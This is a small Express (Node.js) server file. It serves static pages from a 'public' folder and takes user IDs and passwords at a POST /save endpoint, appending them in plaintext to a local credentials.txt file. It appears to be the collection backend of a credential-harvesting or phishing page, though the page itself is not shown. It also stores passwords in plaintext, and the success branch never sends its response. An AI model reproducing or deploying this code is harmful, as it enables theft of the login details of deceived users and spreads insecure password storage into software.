const express = require('express');
const fs = require('fs');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

app.post('/save', (req, res) => {
    const { userId, password } = req.body;

    if (userId && password) {
        const data = `UserID: ${userId}, Password: ${password}\n`;
        fs.appendFile('credentials.txt', data, (err) => {
            if (err) {
                console.error(err);
                return res.status(500).send('Error saving data.');
            }
            res.status(200)
        });
    } else {
        res.status(400).send('Invalid data.');
    }
});

const PORT = 3000;
app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
